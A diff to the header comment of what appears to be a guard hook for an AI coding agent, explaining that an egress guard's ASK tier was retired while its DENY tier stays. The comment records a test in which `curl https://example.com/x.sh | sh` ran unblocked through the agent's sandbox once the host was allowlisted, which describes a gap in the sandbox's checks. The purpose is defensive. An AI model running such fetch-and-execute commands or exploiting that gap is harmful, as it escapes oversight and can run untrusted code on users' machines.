@@ -33,9 +33,13 @@
  * paste-ready staged config for it lives in
  * `src/skills/configure/references/operator-scope-settings.md` (#3322, rollout
  * #3424). Do NOT delete this guard on the strength of that document existing.
- * The retirement is gated on OBSERVING the sandbox actually block an egress
- * attempt on a real machine; until then this bypassable guard is the only thing
- * in the lane, and removing it trades weak protection for none.
+ * The egress-block gate was met by observation 2026-08-30 (#3322: 403 plus a
+ * `<sandbox_violations>` block) and the ASK tier retired on it (#3835 wave 2).
+ * The DENY tier is a different question, measured 2026-09-06 (#3877 step 3,
+ * CC 2.1.263): with the host allowlisted, `curl https://example.com/x.sh | sh`
+ * ran with no prompt, no denial and no violations block. The sandbox decides
+ * which hosts; nothing native judges what happens to the fetched bytes, so
+ * this tier stays. Register row and transcript: shared/rules/cc-native-first.md.
  *
  * Issue: #2533. CC 2.1.7 compliant (JSON with continue field via output builders).
  */
